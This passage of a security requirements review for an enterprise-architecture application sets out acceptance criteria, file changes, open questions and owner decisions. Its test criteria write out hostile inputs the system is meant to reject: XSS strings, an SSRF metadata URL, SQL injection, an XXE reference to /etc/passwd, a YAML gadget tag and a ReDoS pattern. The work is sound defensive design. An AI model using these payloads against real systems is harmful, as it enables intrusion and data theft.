  - AC1: Given the runtime DB role used by the application, when it executes `UPDATE`, `DELETE`, `TRUNCATE`, `ALTER` or `DROP` on `audit.*`, then the database rejects the statement (owner is a different role).
  - AC2: Given an admin sets the audit retention below the configured floor (e.g. 730 days) via `PUT /admin/settings`, when saving, then it is rejected; any accepted change creates an audit event with old and new value.
  - AC3: Given the hash chain enabled by default, when one row in `audit.events` is modified directly in the database, then the verification command reports the first broken record.
  - AC4: Given a service account request with header `X-Agent-Id: someone-else`, when the event is stored, then `agent_id` equals the authenticated `client_id` and the header value is stored only in a separate informational field.
- **Verification**: test (automated, Testcontainers with production DB roles) + inspection of grants

### PR-19: Security event logging

- **Type**: security · **Priority**: must · **Addresses**: SEC-14 · **Related**: REQ-005, REQ-016, REQ-025, REQ-128, REQ-151
- **Statement**: The system MUST record in the audit log, with timestamp, principal, source address, outcome and correlation ID: logout and session revocation, authorization failures (403), role and role-assignment changes, authentication provider and settings changes, visibility configuration changes, service account creation/rotation/deactivation, throttling/lockout events, and bulk exports; application logs MUST NOT contain secrets, tokens, passwords or TOTP codes.
- **Acceptance criteria**:
  - AC1: Given a viewer calls an admin endpoint, when the request is rejected with 403, then an audit event `authz.denied` with principal, operation and target ID exists.
  - AC2: Given an admin assigns a role to a person, when saved, then an audit event `role.assigned` with actor, target person, role and validity exists.
  - AC3: Given the full test suite runs with log capture, when logs are scanned for the test passwords, TOTP secrets, client secrets and bearer tokens used in the tests, then none is found.
  - AC4: Given audit events for a period, when exported via the API, then the export is available as JSON Lines suitable for SIEM ingestion.
- **Verification**: test (automated) + log scan in CI

### PR-20: Machine credential lifecycle and scoping

- **Type**: security · **Priority**: must · **Addresses**: SEC-15 · **Related**: REQ-002, REQ-155, ADR-026
- **Statement**: Machine credentials MUST be stored only as a hash, MUST have a mandatory expiry (default 90 days, maximum configurable), MUST be bound to roles flagged as assignable to service accounts (excluding any `admin` permission), and access tokens issued for them MUST have a lifetime of at most 15 minutes.
- **Acceptance criteria**:
  - AC1: Given an admin creates a service account with role `system-admin`, when the request is processed, then it is rejected with 422.
  - AC2: Given a client secret older than its expiry, when it is used at the token endpoint, then authentication fails with 401 and an audit event is logged; the admin UI shows secrets expiring within 14 days.
  - AC3: Given a successful client credentials grant, when the issued access token is inspected, then `exp - iat` is at most 900 seconds and it contains the `client_id`.
- **Verification**: test (automated) + DB inspection

### PR-21: Ownership of external IDs

- **Type**: security · **Priority**: should · **Addresses**: SEC-15 · **Related**: REQ-153, REQ-154, ADR-026
- **Statement**: The system SHOULD bind each `external_id` namespace (`{system}:`) to the service account(s) allowed to write it, and an integration MUST NOT update entities whose `external_id` namespace belongs to another account or entities without `external_id` unless explicitly granted.
- **Acceptance criteria**:
  - AC1: Given namespace `k8s:` bound to service account A, when service account B upserts `k8s:prod/order-service`, then the request is rejected with 403.
  - AC2: Given an entity created manually (no `external_id`), when a service account calls `PUT /entities/{id}` without the explicit grant, then the request is rejected with 403.
- **Verification**: test (automated)

### PR-22: Controls for server-side outbound requests

- **Type**: security · **Priority**: must · **Addresses**: SEC-16, SEC-18 · **Related**: REQ-147, REQ-068, ADR-006
- **Statement**: Every server-initiated outbound HTTP request to a user- or admin-configured URL (webhooks, PlantUML server, OIDC discovery/test) MUST use HTTPS (configurable exception for operator-approved hosts), MUST resolve and reject loopback, link-local, private and metadata addresses unless explicitly allowlisted by the operator, MUST NOT follow redirects to disallowed addresses, and MUST NOT return response bodies to the caller.
- **Acceptance criteria**:
  - AC1: Given a webhook URL `http://169.254.169.254/latest/meta-data/`, when it is registered, then the registration is rejected.
  - AC2: Given a public webhook host that redirects to `http://10.0.0.5/`, when a delivery is attempted, then the redirect is not followed and the delivery is marked failed.
  - AC3: Given a hostname that resolves to a private address at delivery time (DNS rebinding), when a delivery is attempted, then the request is not sent.
- **Verification**: test (automated)

### PR-23: No raw query languages exposed to clients

- **Type**: security · **Priority**: must · **Addresses**: SEC-17 · **Related**: ADR-013, concept §22
- **Statement**: The API MUST NOT accept raw SQL, Cypher or other database query language from clients; analytics and graph queries MUST be expressed in a typed query model that the server compiles with parameter binding and evaluates through the authorization layer (PR-02, PR-04).
- **Acceptance criteria**:
  - AC1: Given the OpenAPI contract, when inspected, then no request schema contains a field interpreted as SQL or Cypher text.
  - AC2: Given an analytics query whose filter value is `' OR 1=1 --`, when executed, then it is treated as a literal and returns only matching rows.
  - AC3: Given a graph traversal request with a depth above the configured maximum, when submitted, then it is rejected with 400.
- **Verification**: inspection (contract review) + test (automated)

### PR-24: Safe rendering of user-supplied content

- **Type**: security · **Priority**: must · **Addresses**: SEC-18 · **Related**: REQ-068, REQ-070, REQ-078, UC-09, ADR-009
- **Statement**: The clients MUST render all user-supplied content (Markdown, entity names and descriptions, labels, Mermaid, PlantUML output, draw.io XML/SVG) through an allowlist sanitizer, MUST run Mermaid with `securityLevel: strict` and without init directives, MUST isolate the draw.io editor in a separate origin and validate postMessage origins, and MUST serve web portal and Electron renderer with a Content Security Policy that disallows inline scripts and `unsafe-eval`.
- **Acceptance criteria**:
  - AC1: Given an Arc42 answer containing `<img src=x onerror=alert(1)>`, `[x](javascript:alert(1))`, a Mermaid `click` callback and an `%%{init}%%` directive, when it is rendered in the web portal and the Electron client, then no script executes and the links are inert.
  - AC2: Given a draw.io cell with `html=1` and `value="<svg onload=alert(1)>"`, when the diagram preview is rendered, then no script executes.
  - AC3: Given a message posted to the editor window from an origin other than the draw.io origin, when received, then it is ignored.
  - AC4: Given any HTML response of the web portal and the Electron renderer, when headers/meta are inspected, then a CSP without `unsafe-inline` and `unsafe-eval` for `script-src` is present.
- **Verification**: test (automated XSS payload corpus, e.g. Playwright) + inspection

### PR-25: Electron runtime hardening and local data protection

- **Type**: security · **Priority**: must · **Addresses**: SEC-19 · **Related**: ADR-008, ADR-009
- **Statement**: The Electron client MUST enable `sandbox`, `contextIsolation` and disable `nodeIntegration` for all renderers, MUST block navigation and new windows to origins other than the app and the configured OEA server, MUST open external links only after URL scheme validation (`https`), MUST validate all IPC arguments against a schema, MUST set restrictive Electron fuses, MUST store tokens via OS-protected storage, and MUST encrypt the offline cache and delete it on logout or loss of access.
- **Acceptance criteria**:
  - AC1: Given the packaged app, when an automated check (e.g. Electronegativity plus a fuse check) runs in CI, then it reports no enabled `nodeIntegration`, disabled `sandbox`/`contextIsolation`, `webview` tag, or enabled `RunAsNode` fuse.
  - AC2: Given renderer code calls `window.open('https://evil.example')` or navigates there, when executed, then navigation is blocked.
  - AC3: Given a preload API that writes files, when called with a path outside the user-selected export directory, then it is rejected.
  - AC4: Given a user logs out or the server revokes the session (PR-08), when the client next starts, then the offline cache of that user no longer exists on disk.
- **Verification**: test (automated) + inspection

### PR-26: Signed client builds and verified updates

- **Type**: security · **Priority**: must · **Addresses**: SEC-19, SEC-29 · **Related**: ADR-009
- **Statement**: Electron installers and update packages MUST be code-signed (Windows Authenticode, macOS notarization, Linux checksum/signature), and the auto-update mechanism MUST download over HTTPS only and MUST verify the signature against the expected publisher before installing.
- **Acceptance criteria**:
  - AC1: Given an update whose signature does not match the expected publisher, when the client checks for updates, then the update is rejected and the user is informed.
  - AC2: Given an update feed URL with `http://`, when configured, then the client refuses to use it.
  - AC3: Given a release, when its artifacts are inspected, then every installer is signed and a signed checksum file is published.
- **Verification**: test (automated, update test with tampered package) + release checklist inspection

### PR-27: Production-safe defaults, no development auth bypass

- **Type**: security · **Priority**: must · **Addresses**: SEC-20 · **Related**: ADR-027, REQ-075, REQ-156, ADR-013
- **Statement**: Production images MUST NOT contain any authentication stub or test identity provider, the application MUST refuse to start with a development auth mode outside an explicit local profile bound to loopback, and the operator Compose file MUST NOT contain default passwords or keys.
- **Acceptance criteria**:
  - AC1: Given the production container image, when its classpath is scanned, then no development JWT stub class or static signing key is present.
  - AC2: Given the development auth mode is enabled and the server binds to a non-loopback address, when the application starts, then startup fails with a clear message.
  - AC3: Given the operator Compose file, when `docker compose up` runs without a `.env` providing secrets, then startup fails rather than using default credentials; Swagger UI is not reachable.
- **Verification**: test (automated) + image inspection in CI

### PR-28: Safe parsing of imported files

- **Type**: security · **Priority**: must · **Addresses**: SEC-21 · **Related**: REQ-033, REQ-059, REQ-113, REQ-114, ADR-018, ADR-026
- **Statement**: All file imports (YAML, JSON, XML, ZIP) MUST use parsers configured without type instantiation, external entities, DTDs or unbounded alias expansion, MUST enforce one configurable maximum upload size (default 10 MB) and limits on nesting depth, element count and decompressed size, and MUST validate content against a schema before processing.
- **Acceptance criteria**:
  - AC1: Given a YAML file with a global tag such as `!!javax.script.ScriptEngineManager`, when imported, then it is rejected with 422 and no class is instantiated.
  - AC2: Given a YAML "billion laughs" alias bomb or a JSON document nested 10,000 levels deep, when imported, then it is rejected within 2 s without exhausting memory.
  - AC3: Given an XML import containing an external entity referencing `file:///etc/passwd`, when processed, then the entity is not resolved.
  - AC4: Given a file larger than the configured maximum, when uploaded to any import endpoint, then the response is 413 before the body is fully parsed.
- **Verification**: test (automated, malicious file corpus)

### PR-29: Bounded evaluation of user-defined expressions

- **Type**: security · **Priority**: must · **Addresses**: SEC-21, SEC-22 · **Related**: ADR-018, REQ-032, REQ-149
- **Statement**: User-defined expressions (CEL rules, regular expressions in property patterns and CEL `matches`) MUST be checked against a cost budget when saved or imported and MUST be evaluated with a hard limit that actually stops evaluation; regular expressions MUST use a linear-time engine (RE2-compatible).
- **Acceptance criteria**:
  - AC1: Given a CEL expression with nested comprehensions exceeding the cost budget, when saved or imported, then it is rejected with a message naming the limit.
  - AC2: Given the pattern `(a+)+$` and a 50-character input `aaaa…!`, when an entity is validated, then validation completes in under 100 ms.
  - AC3: Given 10,000 entities and a rule at the cost limit, when the conformance analysis runs, then CPU threads used for evaluation never exceed the configured pool size.
- **Verification**: test (automated)

### PR-30: Rate limiting and resource quotas

- **Type**: non-functional · **Priority**: must · **Addresses**: SEC-23 · **Related**: REQ-073, REQ-147, REQ-154, ADR-026
- **Statement**: The system MUST enforce configurable per-principal rate limits and per-request resource limits on the API, with the following defaults: 600 requests/min per principal overall, 60 requests/min for search, 10 batch writes/min per service account, maximum 500 items per batch, maximum page size 200, maximum traversal depth 5, maximum 5 concurrent SSE streams per principal.
- **Acceptance criteria**:
  - AC1: Given a principal that exceeds its rate limit, when it sends the next request, then the response is 429 with `Retry-After`, and other principals are unaffected (p95 latency of their catalog queries stays within REQ-071).
  - AC2: Given a batch with 501 entities, when submitted, then it is rejected with 422 without processing any item.
  - AC3: Given a traversal request with depth 6, when submitted, then it is rejected with 400.
- **Verification**: test (automated load test)

### PR-31: HTTP security headers, CORS, CSRF and cookie attributes

- **Type**: security · **Priority**: must · **Addresses**: SEC-24 · **Related**: REQ-026, REQ-129, ADR-008, ADR-013
- **Statement**: The server MUST send `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` (or `strict-origin`), `frame-ancestors 'none'` and `Cache-Control: no-store` for authenticated API responses; CORS MUST allow only operator-configured origins (never `*` with credentials); state-changing requests authenticated by cookie MUST be protected by a CSRF token or strict origin check; session cookies MUST be `HttpOnly`, `Secure`, `SameSite=Lax` or stricter and use the `__Host-` prefix.
- **Acceptance criteria**:
  - AC1: Given any API and portal response, when headers are inspected, then the listed headers are present with the specified values.
  - AC2: Given a request with `Origin: https://evil.example`, when sent with credentials, then no `Access-Control-Allow-Origin` header is returned.
  - AC3: Given a cookie-authenticated `POST` without a valid CSRF token or with a foreign `Origin`, when processed, then it is rejected with 403.
- **Verification**: test (automated) + scan (e.g. OWASP ZAP baseline in CI)

### PR-32: Secrets and encryption key management

- **Type**: security · **Priority**: must · **Addresses**: SEC-26, SEC-27 · **Related**: REQ-022, REQ-129, REQ-147, REQ-155
- **Statement**: Secrets stored by the application (TOTP secrets, OIDC client secrets, webhook secrets) MUST be encrypted with AES-256-GCM using a key-encryption key supplied from outside the database (file, environment or KMS), MUST support key rotation without data loss, MUST never be returned by any API, and the key MUST NOT be included in database backups.
- **Acceptance criteria**:
  - AC1: Given a database dump, when searched for any stored OIDC client secret or TOTP secret in plaintext or Base32, then none is found.
  - AC2: Given a key rotation command with old and new key configured, when executed, then all secrets are re-encrypted and logins with existing TOTP credentials still succeed.
  - AC3: Given `GET /admin/auth/providers/{id}` and `GET /admin/settings`, when called, then no client secret or license key value is returned (only a "set/not set" indicator).
- **Verification**: test (automated) + DB inspection

### PR-33: Data subject rights and minimization for persons

- **Type**: compliance · **Priority**: must · **Addresses**: SEC-28 · **Related**: `person.md`, ADR-024, UC-10, REQ-077, concept §20
- **Statement**: The system MUST allow an authorized operator to export all personal data stored about a person (profile, credentials metadata, role assignments, audit events as actor, EA content references) in a machine-readable format and to anonymize a person so that name and e-mail are removed from all application tables and from audit display, while audit records remain linked to a pseudonymous identifier; personal data of actors MUST NOT be exposed to principals without `audit:read`.
- **Acceptance criteria**:
  - AC1: Given a person with audit history and process task assignments, when the operator runs the data export for that person, then a JSON file containing all listed data categories is produced and the export is audited.
  - AC2: Given the same person anonymized, when audit events and entity history are retrieved, then actor name and e-mail are replaced by a pseudonym and no table outside the protected identity mapping contains the original e-mail.
  - AC3: Given a principal without `audit:read`, when it calls any portal or view endpoint, then no `actorEmail` is present in any response.
- **Verification**: test (automated) + inspection (record of processing for OEA itself documented in operator docs)

### PR-34: Retention of soft-deleted data

- **Type**: compliance · **Priority**: should · **Addresses**: SEC-28 · **Related**: ADR-019, REQ-083
- **Statement**: The system SHOULD permanently purge soft-deleted entities, their property value history and their attachments after an operator-configurable retention period (default 365 days), while keeping the pseudonymous audit trail.
- **Acceptance criteria**:
  - AC1: Given an entity soft-deleted 366 days ago with default settings, when the purge job runs, then the entity row and its property value history are removed and an audit event `entity.purged` exists.
  - AC2: Given a purge, when the audit trail is queried for that entity ID, then the earlier audit events remain retrievable.
- **Verification**: test (automated)

### PR-35: Supply chain integrity

- **Type**: security · **Priority**: must · **Addresses**: SEC-29 · **Related**: ADR-009, ADR-018, ADR-027, `SECURITY.md`
- **Statement**: Every release MUST publish an SBOM (CycloneDX or SPDX) for backend image and Electron client, MUST sign container images and checksums, MUST be built from pinned dependency versions (lock files, no version ranges, no `@latest`), and CI MUST fail on dependencies with known vulnerabilities of severity High or Critical unless a documented exception exists.
- **Acceptance criteria**:
  - AC1: Given a release tag, when the release artifacts are listed, then SBOMs for backend and client and a signature for the container image are present and verify with the published key.
  - AC2: Given a pull request that introduces a dependency with a known Critical CVE, when CI runs, then the dependency scan job fails.
  - AC3: Given `backend/pom.xml` and `frontend/package-lock.json`, when inspected, then no version range or floating tag is used.
- **Verification**: inspection + CI test

### PR-36: Least privilege for CI/CD workflows

- **Type**: security · **Priority**: should · **Addresses**: SEC-29, SEC-30 · **Related**: ADR-031, `.github/workflows/ci.yml`
- **Statement**: CI workflows MUST declare minimal `permissions` (default `contents: read`), MUST pin third-party actions to commit SHAs, and jobs that execute third-party code (dependency installation, builds, tests) MUST NOT hold write tokens; write operations MUST run in a separate job that only consumes artifacts.
- **Acceptance criteria**:
  - AC1: Given any workflow file, when linted (e.g. zizmor or actionlint with a policy), then every workflow declares `permissions` and every `uses:` of a third-party action references a full commit SHA.
  - AC2: Given the screenshot workflow (ADR-031), when it runs, then the job running `npm ci` has a read-only token and the commit is created by a separate job that touches only `docs/screens/*.png`.
- **Verification**: inspection + CI lint

### PR-37: Generic error responses without internal details

- **Type**: security · **Priority**: must · **Addresses**: SEC-24 · **Related**: REQ-006, REQ-147 (RFC 9457)
- **Statement**: Error responses MUST NOT contain stack traces, SQL, class names, file paths or framework versions; 5xx responses MUST contain only a generic `title` and a correlation ID that maps to the server log entry.
- **Acceptance criteria**:
  - AC1: Given a forced internal exception in any endpoint, when the response is inspected, then it is `application/problem+json` with status 500, a generic title and a `requestId`, and contains none of the forbidden details.
  - AC2: Given the same request ID, when the server log is searched, then the full exception is found there.
- **Verification**: test (automated)

## Required Changes to Existing Artifacts

Summary of the concrete edits named in the findings (in addition to creating the proposed requirements):

| File | Change | Finding |
|---|---|---|
| `api/openapi.yaml` | Per-operation permission declaration, `401`/`403` everywhere; remove prose role hints; fix "Entities – Write" tag; replace `PropertyVisibilityEntry` with REQ-124 model; add visibility fields to `PropertyDefinitionDetail/Write`; add `redacted` to `PropertyValue`/`FieldDiff`; restrict `deleted` param; `ServiceAccountWrite.roles` enum; remove `licenseKey`/`sessionTimeoutMin` from readable settings or define; remove `actorEmail` from portal; add auth, identity, token, webhook, role management endpoints; add `oauth2` and cookie security schemes; `maxLength`/`maxItems`; remove or justify `ldap`; define or remove `portal-reader` | SEC-01, 02, 04, 05, 06, 15, 25, 26, 28, 31 |
| `requirements/req/REQ-004` | Reject every status other than `active`/`invited`; match on (`iss`,`sub`) | SEC-06, SEC-07 |
| `requirements/req/REQ-014`, `business-objects/system-admin-account.md` | Immutable claim identifiers; issuer binding; overage handling; fix example | SEC-08 |
| `requirements/req/REQ-020`, `REQ-029`, `system-admin-account.md` BR-03 | Bootstrap exemption only for first login; no exemption for admin roles; "all roles exempt" semantics | SEC-10 |
| `requirements/req/REQ-024`, `REQ-031` | Expiry and single use of temporary passwords; revoke sessions on reset; admin-on-admin reset rule | SEC-12 |
| `requirements/req/REQ-025` | Remove enrollment-token AC4 (REQ-021 rejected) | SEC-14 |
| `requirements/req/REQ-101`, `REQ-105` | Restore respects property write permission | SEC-04 |
| `requirements/req/REQ-124`–`REQ-128` | Split read/write roles; governance of visibility config and scoping connections; extend masking to all channels | SEC-02, SEC-03 |
| `requirements/req/REQ-068`, `REQ-078` | Mermaid strict mode; operator-hosted PlantUML with security profile; draw.io on separate origin, local copy, postMessage origin validation, allowlist sanitizer | SEC-18 |
| `requirements/req/REQ-083`, `REQ-151`, `adrs/ADR-024` | One retention/immutability statement; owner role separate from runtime role; retention floor; hash chain in Community; pseudonymous actor | SEC-13, SEC-28 |
| `requirements/req/REQ-129`, `REQ-082` | Rewrite at-rest scope; remove "SaaS"; encrypted backups with separate key | SEC-27 |
| `requirements/req/REQ-147`, `REQ-154`, `adrs/ADR-026` | Single max batch size; webhook permission, SSRF controls, filtered payloads; `agent_id` from authenticated client only | SEC-13, SEC-16, SEC-23 |
| `requirements/req/REQ-002`, `REQ-008`, `REQ-155` | Decide one machine credential mechanism; expiry and token lifetime | SEC-15 |
| `requirements/req/REQ-033`, `REQ-059`, `REQ-113` | Harmonize size limits; reference PR-28 | SEC-21 |
| `adrs/ADR-009` | Sandbox, CSP, navigation and IPC rules, fuses, signed HTTPS updates, encrypted offline cache | SEC-19 |
| `adrs/ADR-013`, `concept/70-platform/22-analyzability.md`, `concept/70-platform/21-api-architecture.md` §21.4 | No raw SQL/Cypher endpoints; SSE authentication | SEC-17, SEC-25 |
| `adrs/ADR-018` | CEL cost limits, bounded executor, remove SpEL fallback | SEC-22 |
| `adrs/ADR-027` | JWT stub test-only, startup guard, Compose without default secrets | SEC-20 |
| `adrs/ADR-031` | Split build and commit jobs; read-only token for build; synthetic mock data | SEC-30 |
| `concept/70-platform/21-api-architecture.md` §21.8 | Separate authorization roles from business roles | SEC-01 |
| `business-objects/person.md`, `docs/data-model.puml` | Add `status` lifecycle column (not only `active`); identity binding (`iss`,`sub`); session/refresh-token store; API key or removal | SEC-06, SEC-07, SEC-15 |
| `SECURITY.md` | Working reporting channel (GitHub private reporting); align guarantees | SEC-32 |
| `.github/workflows/ci.yml` | `permissions: contents: read`; pin actions to SHAs; pin `@redocly/cli` version | SEC-29 |

## What Is Already Done Well

- **Anti-enumeration** is a hard constraint including timing side channels (REQ-006) and is applied consistently to passkey, TOTP and enrollment errors (REQ-009 AC2, REQ-010 AC2, REQ-030 AC5).
- **Bootstrapping** is designed against network takeover: setup token only via privileged channel (REQ-017), atomic single bootstrap (REQ-015), audited even before RBAC exists (REQ-016).
- **Credential handling**: credentials separated from Person (`local-credential.md`), never in logs/exports/API (BR-01, BR-04), passkey sign counter check (BR-05), opaque WebAuthn user handle, attestation `none` default, CSPRNG-only password generator without fallback (REQ-027), plaintext shown once (REQ-024, REQ-155), argon2id for client secrets.
- **Weakest login variant is opt-in** and visibly flagged in the audit log (REQ-011 AC2/AC3); 2FA enforcement exists (REQ-020) and OIDC `amr/acr` limits are acknowledged.
- **Property-level authorization is treated as mandatory**, enforced server-side with masking and 403 on write (REQ-126), and override reads are audited (REQ-128 AC2).
- **Audit separation** with INSERT-only runtime grants, separate auditor and cleanup roles, normalized and queryable fields (ADR-024, REQ-151) is a sound basis.
- **Personal dashboards** have explicit object-level checks including direct-URL access (REQ-056 BR-05, AC3).
- **Electron baseline** (`contextIsolation`, `nodeIntegration=false`, `contextBridge`) and **Swagger UI off in production** are decided early (ADR-009, ADR-013).
- **Service accounts** are separated from human identities and visible in the audit log (REQ-155, ADR-026 §7).
- **Spec-first API** with generated interfaces (ADR-013) makes PR-02 cheap to enforce in CI.
- `SECURITY.md` exists with coordinated disclosure timelines before any release.

## Open Questions

| # | Question | Relevant for |
|---|---|---|
| Q1 | Is anonymous (no-login) portal access required for v1, or can it be excluded? If required: per-object publication or instance-wide? | SEC-05, PR-07 |
| Q2 | Is the web portal expected to be reachable from the internet (e.g. for the CIO on mobile), or only from the corporate network/VPN? This changes the priority of PR-12 and PR-31. | SEC-09, SEC-24 |
| Q3 | Are system admins trusted to delete or rewrite audit records (A6)? If yes, REQ-151's DORA/ISO 27001 justification does not hold; if no, PR-18 is a must. | SEC-13 |
| Q4 | Who may edit the metamodel, property visibility and the override list – the same role or separate roles (UC-04 open question)? | SEC-01, SEC-03 |
| Q5 | Should API keys (REQ-002) be kept in addition to OAuth2 client credentials (REQ-155)? | SEC-15 |
| Q6 | Is LDAP a supported auth provider (`openapi.yaml`, `SECURITY.md`)? If yes, an ADR and LDAP-injection/bind-credential requirements are needed. | SEC-31 |
| Q7 | Is a SaaS/hosted offering planned (REQ-129 Context)? Multi-tenancy would invalidate assumption A1 and require tenant isolation requirements. | SEC-27 |
| Q8 | Will the planned raw SQL/Cypher analytics (ADR-013, §22) be dropped for v1, or is there a concrete stakeholder need? | SEC-17 |
| Q9 | May content leave the instance for rendering (public PlantUML server, `embed.diagrams.net`, cloud spell checking in REQ-080)? | SEC-18 |
| Q10 | What retention for the audit trail is binding: 2 years (REQ-083), 7 years (ADR-024 default), or operator choice with a floor? | SEC-13, SEC-28 |

## Owner Decisions (2026-10-13)

Answers of the repository owner (Lukas Mathis) to the open questions. They are binding for turning the proposed requirements into REQs.

| # | Decision | Effect on proposals |
|---|---|---|
| Q1 | No anonymous access in v1; every portal and API access requires authentication | PR-07 becomes "no anonymous access"; `portal-reader` must be an authenticated role |
| Q2 | The web portal must be safe to expose to the internet | PR-12, PR-30, PR-31 are `must` |
| Q3 | Audit records cannot be deleted or changed by the application or by admins; deletion only through the retention policy | PR-18 is `must`; tamper evidence in the Community edition |
| Q4 | Separate roles: metamodel administration vs. security administration (visibility, overrides) | PR-01, PR-05 define separate roles |
| Q5 | Machine access only via service accounts with OAuth2 client credentials; API keys (REQ-002) are dropped | PR-20 covers client credentials only; REQ-002 is rejected |
| Q6 | LDAP is not a supported auth provider | Remove LDAP from REQs; follow-up for `api/openapi.yaml` and `SECURITY.md` |
| Q7 | No SaaS / multi-tenant offering; assumption A1 holds | Remove SaaS wording from REQ-129 |
| Q8 | Raw SQL/Cypher analytics stay, but secured | PR-23 is rewritten: read-only database role, statement timeout, row limit, dedicated analytics permission, audit of every query, no access to audit schema or credentials |
| Q9 | No content leaves the instance for rendering by default; external services only if the operator configures them explicitly | PR-24: self-hosted PlantUML and draw.io, local spell checking |
| Q10 | Audit retention configurable by the operator with a floor of 1 year; default 7 years | PR-18, REQ-083, REQ-151 aligned |
| Q11 | PKCE mandatory for all OIDC clients; MFA mandatory for all privileged accounts; brute-force protection in the application (reverse proxy only as an additional layer); no JWT stub – a real IdP container in development and tests | PR-10, PR-12, PR-15, PR-27 |
| Q12 | OS code signing certificates (Authenticode, Apple notarization) are an open point until Enterprise license revenue covers them; Community releases use free integrity protection (checksums, build provenance attestations, HTTPS-only updates with checksum verification) | PR-26 → REQ-182 |
| Q13 | A person may hold metamodel-admin and security-admin together; the combination is flagged in audit and access review; operators may enable a strict mode | ADR-032 SoD-3 |
| Q14 | Restricted properties are readable only via their `readRoles`; the override role list (REQ-128) is empty by default | ADR-032, REQ-128 |
| Q15 | Four-eyes approval for privileged role assignments is optional (operator setting, default off); assignments are always audited and notified | ADR-032, new requirement |
| Q16 | Removal from an IdP group takes effect in OEA within 15 minutes (re-evaluation at every token refresh) | ADR-032, REQ-165 |
| Q17 | IdP unreachable or refresh rejected: IdP-derived roles no longer apply (fail closed); local roles stay | REQ-165 AC6 |
| Q18 | Four-eyes approval, when enabled, also covers IdP mappings to privileged roles and admin-class permissions on custom roles | REQ-194 |
| Q19 | Reactivation of offboarded persons configurable, default off | REQ-004, person.md |
| Q20 | Ended sessions: tokens deleted immediately, record kept 30 days (configurable) | REQ-189, session.md |

## Sign-off

**Sign-off for the requirements baseline: granted once the listed findings are resolved**, under the following conditions:

1. **Before implementation of the walking skeleton (S1–S2)**: SEC-01 (PR-01, PR-02, PR-03), SEC-06 (PR-08, PR-09), SEC-07 (PR-10), SEC-13 (PR-18 AC1 – owner role separation must be in the first Flyway migration), SEC-20 (PR-27) and SEC-31 (auth endpoints in the contract) must be resolved, because the skeleton implements bootstrapping, OIDC login, entity writes and the catalog, and these decisions are expensive to retrofit.
2. **Before the respective feature is implemented**: the remaining High findings (SEC-02, SEC-03, SEC-05, SEC-08, SEC-09, SEC-10, SEC-17, SEC-18, SEC-19) are resolved in the requirements of that feature (e.g. SEC-18 before UC-09, SEC-19 before the first Electron build).
3. **Before the first public release (v0.x tag)**: Medium findings are resolved or explicitly accepted by the repository owner with a documented rationale; SEC-32 (working disclosure channel) is resolved.

A follow-up review of the updated requirements (delta only) is recommended once the proposed requirements are created and the listed artifacts are changed.
